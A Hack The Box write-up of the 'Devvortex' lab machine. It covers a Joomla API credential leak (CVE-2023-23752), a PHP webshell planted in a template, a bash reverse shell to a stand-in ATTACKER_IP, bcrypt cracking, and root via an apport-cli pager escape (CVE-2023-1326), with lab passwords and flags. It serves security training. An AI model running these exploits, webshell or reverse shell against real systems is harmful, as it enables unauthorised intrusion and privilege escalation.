# Devvortex — Box Writeup

> **Target:** 10.129.190.60  
> **OS:** Linux (Ubuntu)  
> **Difficulty:** Easy  
> **Platform:** Hack The Box  
> **Runtime:** ~1h 31min  
> **Flags:** `0dfc82b91d415e89bc98395ca77b34d1` (user) · `940965a34100c537a67495b6c9c7c5c3` (root)

---

## Executive Summary

Devvortex is an easy-difficulty Linux machine running a Joomla CMS instance that exposes an unauthenticated REST API endpoint, leaking database credentials and user account details. Credentials were reused across services to pivot between accounts, culminating in a sudo misconfiguration around `apport-cli` (CVE-2023-1326) that yields a root shell.

**CVEs exploited:**
| CVE | Vector | Phase |
|-----|--------|-------|
| CVE-2023-23752 | Joomla 4.x unauthenticated API info disclosure | Initial Access |
| CVE-2023-1326 | apport-cli privilege escalation via less pager | Privilege Escalation |

---

## Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  1. NMAP         → Port 80 (nginx) redirects to devvortex.htb              │
│  2. VHOST enum   → Found: dev.devvortex.htb                                │
│  3. CMS ID       → Joomla 4.2.6 confirmed (administrator/manifests/)        │
│  4. API LEAK      → CVE-2023-23752: /api/v1/config/application?public=true │
│     └─ DB creds  → lewis : P4ntherg0t1n5r3c0n##                             │
│     └─ Users     → lewis (Super Users), logan (Registered)                  │
│  5. ADMIN ACCESS → lewis login at /administrator/ → Super User panel       │
│  6. WEBSHELL     → Created test.php in Cassiopeia template                  │
│  7. REVERSE SHELL → uid=33(www-data)                                        │
│  8. MYSQL ENUM   → Retrieved logan's bcrypt hash from sd4fg_users          │
│  9. HASH CRACK   → hashcat -m 3200 + rockyou.txt → tequieromucho            │
│ 10. su logan     → uid=1000(logan), sudo NOPASSWD: /usr/bin/apport-cli      │
│ 11. ROOT SHELL   → CVE-2023-1326: sudo apport-cli → !bash → uid=0           │
│ 12. ROOT FLAG    → 940965a34100c537a67495b6c9c7c5c3                        │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Phase 1 — Reconnaissance

### Port Scan
```bash
nmap -sC -sV -Pn -oN nmap.initial 10.129.190.60
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
```

### VHost Discovery
```bash
# ffuf — found hidden dev subdomain
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
  -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fw 4 -t 100

# Result: dev.devvortex.htb → Status 200, Size 23221
```
Add to `/etc/hosts`:
```
10.129.190.60  dev.devvortex.htb
```

### CMS Identification
Browsing `http://dev.devvortex.htb` reveals the Cassiopeia template (Joomla 4.x default). Admin panel at `/administrator/`.

**Version fingerprinting:**
```bash
curl -s "http://dev.devvortex.htb/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+'
# Output: 4.2.6
```

> **4.0.0 ≤ 4.2.6 ≤ 4.2.7 → VULNERABLE to CVE-2023-23752**

---

## Phase 2 — Initial Access (CVE-2023-23752)

### What is CVE-2023-23752?
Improper access control in Joomla 4.0.0–4.2.7 REST API. Appending `?public=true` to API endpoints bypasses authentication, exposing sensitive configuration and user data.

**Root cause:** The API router merges user-supplied `?public=true` into routing variables without validating against the server's `publicGets` flag, bypassing auth checks.

### Exploitation

**1. Extract database credentials:**
```bash
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" \
  -H "Accept: application/vnd.api+json" | jq
```
| Field | Value |
|-------|-------|
| DB Type | mysqli |
| DB Host | localhost |
| DB User | lewis |
| DB Password | `P4ntherg0t1n5r3c0n##` |
| DB Name | joomla |
| DB Prefix | `sd4fg_` |

**2. Enumerate users:**
```bash
curl -s "http://dev.devvortex.htb/api/index.php/v1/users?public=true" \
  -H "Accept: application/vnd.api+json" | jq
```
| User | Group | Email |
|------|-------|-------|
| lewis | Super Users | lewis@devvortex.htb |
| logan | Registered | logan@devvortex.htb |

### Admin Access & Webshell

1. Login to `http://dev.devvortex.htb/administrator/` as `lewis`
2. Navigate: **System → Site Templates → Cassiopeia Details and Files**
3. Create new file `test.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Trigger reverse shell:
   ```bash
   curl "http://dev.devvortex.htb/templates/cassiopeia/test.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%27"
   ```
5. **Shell obtained:** `www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$`

---

## Phase 3 — Lateral Movement

From the www-data shell, connect to MySQL using the leaked DB credentials:
```bash
mysql -u root -p -S /var/run/mysqld/mysqld.sock
# Password: P4ntherg0t1n5r3c0n##
```

```sql
USE joomla;
SELECT id, name, username, email, password FROM sd4fg_users;
```

| Username | Password Hash |
|----------|---------------|
| logan | `$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12` |

**Crack with hashcat:**
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# Result: tequieromucho
```

**Pivot to logan:**
```bash
su - logan
# Password: tequieromucho
```

**User flag:**
```
/home/logan/user.txt → 0dfc82b91d415e89bc98395ca77b34d1
```

---

## Phase 4 — Privilege Escalation (CVE-2023-1326)

### Sudo Discovery
```bash
sudo -l
# User logan may run the following commands on devvortex:
#     (ALL : ALL) ALL
#     (ALL) NOPASSWD: /usr/bin/apport-cli
```

### What is CVE-2023-1326?
Improper privilege management in `apport-cli` (≤ 2.26.0). When run via sudo, the pager (`less`) inherits root privileges. The `!` escape in `less` spawns a shell running as root.

**Apport-cli version on target:** `2.20.11` (vulnerable)

### Exploitation

**1. Generate a crash file (apport-cli requires one):**
```bash
sleep 100 &
kill -11 $!
# Creates /var/crash/_usr_bin_bash.1000.crash
```

**2. Trigger the vulnerable binary:**
```bash
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_bash.1000.crash
```

**3. At the apport-cli menu, press `v` to view the report** (launches `less`)

**4. Inside `less`, press `!` then type `bash` and Enter:**
```
!bash
```

**5. Verify root:**
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**
```
/root/root.txt → 940965a34100c537a67495b6c9c7c5c3
```

---

## Quick Reference

### Exploit Commands Summary
```bash
# 1. Joomla API leak
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" \
  -H "Accept: application/vnd.api+json" | jq

# 2. Webshell trigger
curl "http://dev.devvortex.htb/templates/cassiopeia/test.php?cmd=<reverse_shell_cmd>"

# 3. Hash crack
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# 4. Privesc
sleep 100 & kill -11 $!
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_bash.1000.crash
# → v → !bash
```

### Key Credentials
| Service | Username | Password |
|---------|----------|----------|
| MySQL | root | P4ntherg0t1n5r3c0n## |
| MySQL | lewis | P4ntherg0t1n5r3c0n## |
| Joomla Admin | lewis | P4ntherg0t1n5r3c0n## |
|logan (system) | logan | tequieromucho |

### CVE Summary
| CVE | Product | Impact | Fix |
|-----|---------|--------|-----|
| CVE-2023-23752 | Joomla 4.0.0–4.2.7 | Unauthenticated info disclosure | Upgrade to 4.2.8+ |
| CVE-2023-1326 | apport-cli ≤ 2.26.0 | Privilege escalation (root) | Patch via `apport-cli 2.20.11-0ubuntu82.4+` |

---

## Lessons Learned

1. **Subdomain enumeration is mandatory.** The main site was a decoy; the CMS lived on `dev.devvortex.htb` — a common trick on HTB boxes.
2. **Joomla 4.x API leaks are high-value targets.** The `?public=true` bypass exposes credentials and user data with zero authentication.
3. **Password reuse across services.** The same password `tequieromucho` worked for system login after being recovered from the database.
4. **Sudo misconfigurations compound risk.** `NOPASSWD: apport-cli` is a documented GTFOBins escape path (CVE-2023-1326 / CVE-2023-26604).
5. **Crash file generation is trivial.** `sleep 100 & kill -11 $!` reliably creates a valid Apport crash file without special tooling.

---

## Files Reference

| File | Description |
|------|-------------|
| [recon.md](../retired/Devvortex/recon.md) | Full reconnaissance and enumeration notes |
| [exploit.md](../retired/Devvortex/exploit.md) | CVE-2023-23752 exploitation and shell acquisition |
| [privesc.md](../retired/Devvortex/privesc.md) | MySQL enumeration, hash cracking, CVE-2023-1326 root |
| [loot/database_dump.txt](../retired/Devvortex/loot/database_dump.txt) | API response: DB config |
| [loot/users_dump.txt](../retired/Devvortex/loot/users_dump.txt) | API response: user accounts |
| [raw_data/nmap.initial](../retired/Devvortex/raw_data/nmap.initial) | Nmap scan results |
| [raw_data/logan.hash](../retired/Devvortex/raw_data/logan.hash) | Cracked bcrypt hash |
| [playbooks/](../playbooks/) | Technique-specific playbooks |
